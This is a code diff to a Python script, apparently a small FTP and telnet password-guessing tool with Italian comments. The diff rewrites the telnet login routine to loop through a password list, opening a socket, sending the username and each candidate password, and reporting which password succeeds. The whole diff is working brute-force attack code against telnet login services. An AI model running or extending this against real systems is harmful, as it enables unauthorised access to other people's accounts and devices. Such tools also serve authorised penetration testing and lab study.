@@ -3,6 +3,7 @@ import sys
 import time
 from ftplib import FTP, error_perm
 import socket
+import re
 
 # List and dictonaries
 modes = {
@@ -206,26 +207,52 @@ def telnet_1_info():
         else:
             return password_list
 
+def clean_telnet(data: bytes) -> str:
+    cleaned = re.sub(b'\xff[\xf0-\xff][\x00-\xff]|\xff\xfa.*?\xff\xf0', b'', data, flags=re.DOTALL)
+    return cleaned.decode('utf-8', 'ignore').strip()
+
 def telnet_1_connect():
     password_list = telnet_1_info()
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((info['host'], info['port']))
-    time.sleep(0.5)
     for password in password_list:
-        s.recv(1024).decode('utf-8', 'ignore')
-        s.sendall(f'{info['user']}\r\n'.encode('utf-8'))
-        time.sleep(0.5)
-        s.recv(1024).decode('utf-8', 'ignore')
-        s.sendall(f'{password}\r\n'.encode('utf-8'))
-        time.sleep(0.5)
-        answer = (s.recv(1024).decode('utf-8', 'ignore'))
-        if answer.lower() == 'denied' or answer.lower() == 'denied':
-            print(f'Login failed with user "{info['user']}" and password "{password}".')
-            continue
-        else:
-            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
-            break
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(3.0)
+            s.connect((info['host'], info['port']))
             
+            # Attende e legge tutto il banner iniziale (che arriva subito)
+            time.sleep(0.5)
+            banner = clean_telnet(s.recv(4096))
+            
+            # Invia l'username
+            s.sendall(f"{info['user']}\r\n".encode('utf-8'))
+            time.sleep(0.3)
+            s.recv(1024) # Legge la risposta intermedia (es. "Password:")
+            
+            # Invia la password
+            s.sendall(f"{password}\r\n".encode('utf-8'))
+            time.sleep(0.5)
+            
+            # Legge la risposta finale
+            response = clean_telnet(s.recv(1024))
+            s.close()
+            
+            # Verifica
+            if "incorrect" in response.lower() or "failed" in response.lower():
+                print(f"[-] Fallito: {password}")
+            else:
+                print(f"[+] SUCCESSO! Password: {password}")
+                break
+                
+        except Exception as e:
+            print(f"[!] Errore: {e}")
+            try:
+                s.close()
+            except:
+                pass
+
+
+    
+
             
 
 
